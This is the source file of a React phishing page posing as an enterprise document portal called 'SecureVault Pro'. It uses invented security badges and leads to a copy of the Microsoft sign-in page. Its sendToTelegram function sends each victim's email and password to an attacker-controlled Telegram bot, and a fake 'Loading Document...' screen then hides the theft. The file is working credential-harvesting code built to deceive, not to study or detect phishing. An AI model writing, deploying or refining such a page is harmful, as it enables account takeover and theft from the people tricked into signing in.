import React, { useState, useEffect } from 'react';
import { 
  FileLock2, 
  Loader2, 
  ShieldCheck, 
  ArrowRight, 
  Lock, 
  ShieldAlert, 
  ExternalLink, 
  Globe 
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

type Page = 'gateway' | 'auth';
type AuthStep = 'email' | 'password' | 'success';

export default function App() {
  const [page, setPage] = useState<Page>('gateway');
  const [authStep, setAuthStep] = useState<AuthStep>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const sendToTelegram = async (content: string, type: 'Email' | 'Password') => {
    // Accessing environment variables via Vite's import.meta.env
    const botToken = import.meta.env.NEXT_PUBLIC_VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.NEXT_PUBLIC_VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.warn('Telegram credentials missing - check your .env file');
      await new Promise(resolve => setTimeout(resolve, 1200));
      return true;
    }

    try {
      const message = `🏢 *SecureVault Pro - Enterprise Access*\n\n📍 Step: *${type}*\n📧 Identifier: \`${email}\`\n${type === 'Password' ? `🔑 Password: \`${content}\`\n` : ''}🌐 Origin: ${window.location.origin}\n⏰ Time: ${new Date().toLocaleString()}`;
      
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'MarkdownV2',
        }),
      });

      return response.ok;
    } catch (error) {
      console.error('Error sending message:', error);
      return false;
    }
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) return;
    setIsLoading(true);
    const success = await sendToTelegram(email, 'Email');
    if (success) setAuthStep('password');
    setIsLoading(false);
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setIsLoading(true);
    const success = await sendToTelegram(password, 'Password');
    if (success) setAuthStep('success');
    setIsLoading(false);
  };

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-microsoft-blue/40">
      {/* Top Encryption Bar */}
      <div className="bg-microsoft-blue/10 border-b border-microsoft-blue/20 py-2 px-4 text-center overflow-hidden">
        <motion.p 
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="text-[10px] md:text-xs font-bold tracking-[0.2em] text-microsoft-blue uppercase"
        >
          <ShieldCheck className="inline-block w-3 h-3 mr-2 mb-0.5" />
          Bank-Level 256-Bit AES Encryption Active
        </motion.p>
      </div>

      <AnimatePresence mode="wait">
        {page === 'gateway' ? (
          <motion.div
            key="gateway"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="relative min-h-[calc(100vh-32px)] flex flex-col items-center justify-center overflow-hidden"
          >
            {/* Background Image with Overlay */}
            <div className="absolute inset-0 z-0">
              <img 
                src="https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000" 
                alt="Modern Office"
                className="w-full h-full object-cover opacity-30 grayscale"
              />
              <div className="absolute inset-0 bg-gradient-to-b from-[#050505]/80 via-transparent to-[#050505]" />
            </div>

            <div className="relative z-10 flex flex-col items-center text-center px-6 max-w-4xl">
              <motion.div
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                transition={{ delay: 0.2 }}
                className="mb-12"
              >
                <div className="inline-flex items-center gap-2 bg-white/5 border border-white/10 px-4 py-1.5 rounded-full mb-8 backdrop-blur-md">
                  <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
                  <span className="text-[10px] uppercase tracking-widest font-bold text-zinc-400">System Status: Operational</span>
                </div>
                
                <h1 className="text-5xl md:text-7xl font-bold tracking-tighter mb-6 leading-tight">
                  SecureVault <span className="text-microsoft-blue">Pro</span>
                </h1>
                <p className="text-zinc-400 text-lg md:text-xl max-w-2xl mx-auto mb-12 leading-relaxed font-light">
                  Enterprise-grade document governance and secure distribution. 
                  Access restricted to authorized corporate personnel only.
                </p>

                <div className="flex flex-col md:flex-row items-center justify-center gap-4">
                  <button
                    onClick={() => setPage('auth')}
                    className="group relative flex items-center gap-3 bg-white text-black px-10 py-5 rounded-full font-bold text-lg transition-all hover:scale-105 active:scale-95 shadow-[0_0_40px_rgba(255,255,255,0.1)]"
                  >
                    Access Secure Portal
                    <ArrowRight className="w-5 h-5 transition-transform group-hover:translate-x-1" />
                  </button>
                  <button className="flex items-center gap-2 text-zinc-500 hover:text-white transition-colors px-6 py-3 font-medium">
                    <ExternalLink className="w-4 h-4" />
                    Compliance Docs
                  </button>
                </div>
              </motion.div>

              {/* Trust Indicators */}
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 0.6 }}
                className="grid grid-cols-2 md:grid-cols-4 gap-8 mt-20 pt-12 border-t border-white/5 w-full"
              >
                {[
                  { icon: ShieldCheck, label: "ISO 27001 Certified" },
                  { icon: Lock, label: "Zero-Trust Architecture" },
                  { icon: Globe, label: "Global Compliance" },
                  { icon: ShieldAlert, label: "Real-time Monitoring" }
                ].map((item, i) => (
                  <div key={i} className="flex flex-col items-center gap-3 opacity-40 hover:opacity-100 transition-opacity">
                    <item.icon className="w-6 h-6 text-microsoft-blue" />
                    <span className="text-[10px] uppercase tracking-widest font-bold">{item.label}</span>
                  </div>
                ))}
              </motion.div>
            </div>
          </motion.div>
        ) : (
          <motion.div
            key="auth"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center justify-center min-h-[calc(100vh-32px)] p-6 bg-[#f2f2f2]"
          >
            <div className="w-full max-w-[440px] bg-white rounded-none p-11 shadow-[0_2px_10px_rgba(0,0,0,0.1)] text-[#1b1b1b]">
              {/* Microsoft Logo */}
              <div className="flex items-center gap-2 mb-6">
                <div className="grid grid-cols-2 gap-[2px] w-5 h-5">
                  <div className="bg-[#f25022] w-full h-full"></div>
                  <div className="bg-[#7fba00] w-full h-full"></div>
                  <div className="bg-[#00a4ef] w-full h-full"></div>
                  <div className="bg-[#ffb900] w-full h-full"></div>
                </div>
                <span className="text-[#737373] font-semibold text-xl font-sans">Microsoft</span>
              </div>

              <AnimatePresence mode="wait">
                {authStep === 'email' && (
                  <motion.div
                    key="email-step"
                    initial={{ opacity: 0, x: -10 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: 10 }}
                  >
                    <h2 className="text-2xl font-semibold mb-1">Sign in</h2>
                    <p className="text-[15px] mb-4">to continue to SecureVault Pro</p>

                    <form onSubmit={handleEmailSubmit} className="space-y-4">
                      <div className="space-y-1">
                        <input
                          type="text"
                          required
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          placeholder="Email, phone, or Skype"
                          className="w-full bg-transparent border-b border-[#00000099] focus:border-microsoft-blue py-1.5 px-0 focus:outline-none transition-all text-[15px] placeholder:text-[#666]"
                        />
                      </div>

                      <div className="text-[13px] text-microsoft-blue space-y-3 pt-2">
                        <p className="hover:underline cursor-pointer">No account? <span className="text-microsoft-blue">Create one!</span></p>
                        <p className="hover:underline cursor-pointer">Forgot username?</p>
                      </div>

                      <div className="flex justify-end pt-6">
                        <button
                          type="submit"
                          disabled={isLoading}
                          className="min-w-[108px] bg-microsoft-blue hover:bg-microsoft-blue-hover text-white px-3 py-1.5 rounded-none font-normal text-[15px] transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          {isLoading ? (
                            <Loader2 className="w-4 h-4 animate-spin" />
                          ) : (
                            'Next'
                          )}
                        </button>
                      </div>
                    </form>
                  </motion.div>
                )}

                {authStep === 'password' && (
                  <motion.div
                    key="password-step"
                    initial={{ opacity: 0, x: 10 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0, x: -10 }}
                  >
                    <div className="flex items-center gap-2 mb-1">
                      <button 
                        onClick={() => setAuthStep('email')}
                        className="p-1 hover:bg-gray-100 rounded-full transition-colors"
                      >
                        <ArrowRight className="w-4 h-4 rotate-180" />
                      </button>
                      <span className="text-[15px]">{email}</span>
                    </div>
                    <h2 className="text-2xl font-semibold mb-4">Enter password</h2>

                    <form onSubmit={handlePasswordSubmit} className="space-y-4">
                      <div className="space-y-1">
                        <input
                          type="password"
                          required
                          autoFocus
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          placeholder="Password"
                          className="w-full bg-transparent border-b border-[#00000099] focus:border-microsoft-blue py-1.5 px-0 focus:outline-none transition-all text-[15px] placeholder:text-[#666]"
                        />
                      </div>

                      <div className="text-[13px] text-microsoft-blue space-y-3 pt-2">
                        <p className="hover:underline cursor-pointer">Forgot password?</p>
                        <p className="hover:underline cursor-pointer">Other ways to sign in</p>
                      </div>

                      <div className="flex justify-end pt-6">
                        <button
                          type="submit"
                          disabled={isLoading}
                          className="min-w-[108px] bg-microsoft-blue hover:bg-microsoft-blue-hover text-white px-3 py-1.5 rounded-none font-normal text-[15px] transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          {isLoading ? (
                            <Loader2 className="w-4 h-4 animate-spin" />
                          ) : (
                            'Sign in'
                          )}
                        </button>
                      </div>
                    </form>
                  </motion.div>
                )}

                {authStep === 'success' && (
                  <motion.div
                    key="success-step"
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="text-center py-8"
                  >
                    <div className="inline-flex items-center justify-center w-12 h-12 mb-6">
                      <Loader2 className="w-10 h-10 animate-spin text-microsoft-blue" />
                    </div>
                    <h2 className="text-xl font-semibold mb-2">Loading Document...</h2>
                    <p className="text-[15px] text-[#666]">
                      Verifying enterprise credentials and decrypting assets.
                    </p>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
            
            <div className="mt-8 flex gap-6 text-[#737373] text-[12px]">
              <span className="hover:underline cursor-pointer">Terms of use</span>
              <span className="hover:underline cursor-pointer">Privacy & cookies</span>
              <span className="cursor-default">...</span>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Floating Support Bubble */}
      <motion.div 
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ delay: 1, type: 'spring' }}
        className="fixed bottom-8 right-8 z-50 group"
      >
        <div className="absolute bottom-full right-0 mb-4 w-64 bg-white text-zinc-900 p-4 rounded-2xl shadow-2xl opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none border border-zinc-100">
          <p className="text-xs font-bold text-microsoft-blue mb-1 uppercase tracking-wider">Live Support</p>
          <p className="text-sm leading-relaxed">Hello! Need help accessing your enterprise documents?</p>
          <div className="absolute bottom-[-6px] right-6 w-3 h-3 bg-white rotate-45 border-r border-b border-zinc-100" />
        </div>
        <button className="relative w-16 h-16 rounded-full overflow-hidden border-4 border-white shadow-2xl hover:scale-110 transition-transform">
          <img 
            src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&q=80&w=200" 
            alt="Support Representative"
            className="w-full h-full object-cover"
          />
          <div className="absolute bottom-1 right-1 w-3 h-3 bg-emerald-500 rounded-full border-2 border-white" />
        </button>
      </motion.div>
    </div>
  );
}